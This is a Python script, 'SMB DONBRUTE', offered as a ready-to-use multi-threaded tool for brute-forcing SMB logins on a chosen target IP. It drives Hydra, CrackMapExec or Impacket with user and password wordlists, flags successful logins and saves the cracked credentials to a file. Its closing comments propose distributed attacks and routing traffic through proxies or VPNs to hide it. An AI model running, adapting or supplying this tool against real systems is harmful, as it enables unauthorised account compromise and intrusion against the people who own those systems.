import os
import subprocess
import threading
from queue import Queue
import logging
import time
import multiprocessing  # for dynamic thread count

# === ASCII BANNER ===
ascii_banner = r"""
 ██████  ██████  ███    ██ ██████  ██████  ██    ██ ████████ ████████ ███████ 
██      ██    ██ ████   ██ ██   ██ ██   ██ ██    ██    ██       ██    ██      
██      ██    ██ ██ ██  ██ ██   ██ ██   ██ ██    ██    ██       ██    █████   
██      ██    ██ ██  ██ ██ ██   ██ ██   ██ ██    ██    ██       ██    ██      
 ██████  ██████  ██   ████ ██████  ██████   ██████     ██       ██    ███████ 
                        SMB DONBRUTE - Optimized Brute Force Tool              
"""
print(ascii_banner)

# === SETUP LOGGING (Console and File) ===
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("smb_donbrute.log", mode='a')
    ]
)

def get_input(prompt, valid_choices=None):
    while True:
        choice = input(prompt).strip()
        if valid_choices and choice not in valid_choices:
            logging.error("Invalid choice! Please try again.")
        else:
            return choice

# === CONFIGURATIONS ===
TARGET_IP = get_input("Enter the target IP: ")
SHARE_NAME = get_input("Enter the SMB share name: ")

# === USERLIST SELECTION ===
userlist_choice = get_input("Press 1 for the built-in userlist or 2 to provide the path to your userlist: ", ['1', '2'])
USERLIST_PATH = os.path.join(os.getcwd(), 'userlist.txt') if userlist_choice == '1' else get_input("Enter the path to the username list: ")

# === TOOL SELECTION ===
tool_choice = get_input("Press 'h' for Hydra, 'c' for CrackMapExec, 'i' for Impacket, or 'a' for all: ", ['h', 'c', 'i', 'a'])
TOOL = {'h': 'hydra', 'c': 'crackmapexec', 'i': 'impacket', 'a': 'all'}[tool_choice]

# === THREAD COUNT (Dynamic Enhancement) ===
default_threads = multiprocessing.cpu_count() * 2
thread_input = get_input(f"Enter thread count (default {default_threads}): ") or str(default_threads)
try:
    THREAD_COUNT = int(thread_input)
except ValueError:
    logging.warning("Invalid thread count input, using default.")
    THREAD_COUNT = default_threads

# === RATE LIMITING (Delay between attempts) ===
delay_input = get_input("Enter delay between attempts in seconds (default 0.5): ") or "0.5"
try:
    DELAY = float(delay_input)
except ValueError:
    logging.warning("Invalid delay input, using default 0.5 seconds.")
    DELAY = 0.5

# === WORDLIST SELECTION ===
wordlist_choice = get_input("Press 1 for the built-in wordlist or 2 to provide the path to your wordlist: ", ['1', '2'])
WORDLIST_PATH = os.path.join(os.getcwd(), 'wordlist.txt') if wordlist_choice == '1' else get_input("Enter the path to the password list: ")

# === CHECK FILES EXISTENCE ===
if not os.path.exists(USERLIST_PATH) or not os.path.exists(WORDLIST_PATH):
    logging.error("Userlist or wordlist file not found!")
    exit(1)

# === TOOL VERIFICATION FUNCTIONS ===
def is_tool_installed(tool_name):
    return subprocess.run(["which", tool_name], capture_output=True, text=True).stdout.strip() != ""

def get_tool_version(tool_name):
    try:
        result = subprocess.run([tool_name, "--version"], capture_output=True, text=True)
        if result.returncode == 0:
            logging.info(f"{tool_name} version: {result.stdout.strip()}")
    except Exception as e:
        logging.error(f"Error getting {tool_name} version: {e}")

if TOOL != "all" and not is_tool_installed(TOOL):
    logging.error(f"{TOOL} is not installed! Install it first.")
    exit(1)
if TOOL == "all":
    for tool in ['hydra', 'crackmapexec', 'impacket']:
        if is_tool_installed(tool):
            get_tool_version(tool)
else:
    get_tool_version(TOOL)

# === GLOBAL VARIABLES FOR SUCCESS DETECTION AND STATISTICS ===
found = threading.Event()  # Flag to stop all threads when credentials are found
attempt_count = 0
attempt_lock = threading.Lock()

# Advanced success detection keywords (can be further tuned)
SUCCESS_KEYWORDS = ["valid", "success", "pwned", "session established", "authenticated"]

def generate_command(username, password):
    """Generate the command based on the selected tool."""
    if TOOL == "hydra":
        return ["hydra", "-l", username, "-p", password, f"smb://{TARGET_IP}", "-V"]
    elif TOOL == "crackmapexec":
        return ["crackmapexec", "smb", TARGET_IP, "-u", username, "-p", password]
    elif TOOL == "impacket":
        return ["smbclient.py", f"//{TARGET_IP}/{SHARE_NAME}", "-U", f"{username}%{password}"]
    else:
        # If "all" is selected, you could iterate through all tools (this example defaults to Hydra).
        return ["hydra", "-l", username, "-p", password, f"smb://{TARGET_IP}", "-V"]

def brute_force(username, password):
    global attempt_count
    if found.is_set():
        return

    command = generate_command(username, password)
    try:
        # Adding a timeout for each subprocess call helps prevent hanging
        result = subprocess.run(command, capture_output=True, text=True, timeout=15)
    except subprocess.TimeoutExpired:
        logging.warning(f"Command timed out: {' '.join(command)}")
        time.sleep(DELAY)
        return
    except subprocess.SubprocessError as e:
        logging.error(f"Subprocess error: {e}")
        time.sleep(DELAY)
        return

    output = result.stdout.lower()
    # Advanced success detection using additional keywords
    if any(keyword in output for keyword in SUCCESS_KEYWORDS):
        logging.info(f"Found Credentials: {username}:{password}")
        with open("smb_brute_results.txt", "a") as f:
            f.write(f"{username}:{password}\n")
        found.set()  # Stop further attempts once credentials are found
    else:
        logging.debug(f"Attempt failed for {username}:{password}")

    with attempt_lock:
        attempt_count += 1
    time.sleep(DELAY)  # Rate limiting between attempts

# === LOAD CREDENTIALS INTO A QUEUE ===
queue = Queue()

try:
    with open(USERLIST_PATH, "r") as users:
        user_list = [user.strip() for user in users if user.strip()]
except IOError as e:
    logging.error(f"Error reading userlist file: {e}")
    exit(1)

try:
    with open(WORDLIST_PATH, "r", encoding="utf-8") as wordlist:
        password_list = [password.strip() for password in wordlist if password.strip()]
except UnicodeDecodeError:
    logging.warning(f"Error decoding {WORDLIST_PATH} with UTF-8, trying ISO-8859-1.")
    try:
        with open(WORDLIST_PATH, "r", encoding="ISO-8859-1") as wordlist:
            password_list = [password.strip() for password in wordlist if password.strip()]
    except Exception as e:
        logging.error(f"Error reading wordlist file with fallback encoding: {e}")
        exit(1)
except IOError as e:
    logging.error(f"Error reading wordlist file: {e}")
    exit(1)

for user in user_list:
    for password in password_list:
        queue.put((user, password))

# === WORKER FUNCTION FOR MULTI-THREADED BRUTE-FORCING ===
def worker():
    while not queue.empty() and not found.is_set():
        username, password = queue.get()
        logging.info(f"Trying {username}:{password}")
        brute_force(username, password)
        queue.task_done()

# === CREATE AND START THREADS ===
threads = []
for _ in range(THREAD_COUNT):
    t = threading.Thread(target=worker)
    t.start()
    threads.append(t)

# Wait for all threads to finish
for t in threads:
    t.join()

logging.info("Brute-force attack completed!")
logging.info(f"Total attempts: {attempt_count}")

# === FUTURE ENHANCEMENTS ===
# You can expand this tool further by:
# - Implementing distributed brute-force (client-server model)
# - Adding a GUI for easier configuration and monitoring
# - Integrating proxy/VPN support to route your traffic
# - Generating detailed reports automatically after the attack
